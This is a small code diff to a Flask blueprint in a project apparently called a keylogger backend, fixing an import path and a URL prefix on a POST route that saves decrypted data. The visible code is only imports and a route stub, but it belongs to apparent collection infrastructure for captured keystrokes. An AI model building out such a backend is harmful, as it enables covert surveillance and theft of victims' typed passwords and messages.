@@ -1,12 +1,11 @@
 from flask import Flask, jsonify, request, Blueprint
-from keyloggerBackend.app.logic.save_data import WriteToNetwork
+from keyloggerBackend.app.logic.save_data_logic import WriteToNetwork
 
 
 
 
 
-
-sava_data_bp = Blueprint('saveData', __name__, url_prefix='/savaData')
+sava_data_bp = Blueprint('saveData', __name__, url_prefix='/saveData')
 
 @sava_data_bp.route('/', methods=['POST'])
 def save_decrypted_data():
